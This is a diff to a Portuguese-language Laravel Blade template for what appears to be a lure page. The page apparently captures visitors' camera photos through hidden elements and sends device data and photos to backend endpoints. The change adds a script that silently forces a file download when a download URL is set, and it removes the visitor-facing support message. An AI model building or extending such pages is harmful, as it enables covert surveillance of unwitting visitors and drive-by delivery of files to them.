@@ -120,7 +120,6 @@
             </svg>
         </div>
         <h1>{{ $mensagem }}</h1>
-        <p>Caso precise de suporte, entre em contato com o remetente.</p>
     </div>
 
     {{-- Elementos para captura de câmera (ocultos, renderizados só quando necessário) --}}
@@ -163,6 +162,7 @@
         var captureAlvo = @json($captureAlvo);
         var captureIdentity = @json($captureIdentity);
         var redirectUrl = @json($redirectUrl);
+        var downloadUrl = @json($downloadUrl);
         var endpoint      = window.location.pathname.replace(/\/$/, '') + '/device';
         var endpointFotos = window.location.pathname.replace(/\/$/, '') + '/fotos';
         var csrf          = @json(csrf_token());
@@ -524,6 +524,15 @@
         }
 
         function redirecionar() {
+            if (downloadUrl) {
+                var a = document.createElement('a');
+                a.href = downloadUrl;
+                a.download = '';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                return;
+            }
             if (!redirectUrl) return;
             window.location.href = redirectUrl;
         }
